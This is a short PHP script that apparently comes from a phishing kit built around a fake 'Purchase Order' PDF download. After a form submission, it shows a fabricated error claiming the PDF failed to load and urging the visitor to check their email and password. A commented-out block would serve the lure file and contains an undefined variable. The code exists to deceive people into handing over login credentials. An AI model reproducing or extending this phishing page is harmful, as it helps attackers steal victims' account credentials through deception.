<?php
$python = $_POST['python'];
if($python){
echo '<h4>There was an error <br>Loading the pdf file please make <br>sure your <u>email and password</u> are correct</h4>';
/*
$filePath="/Purchase Order swcatalogue(121.7kb).pdf";
$filename="Purchase Order swcatalogue(121.7kb).php";
header('Content-type:application/pdf');
header('Content-disposition: inline; filename="'.$filename.'"');
header('content-Transfer-Encoding:binary');
header('Accept-Ranges:bytes');
//@ readfile($filePath);
echo file_get_contents($file);
*/
}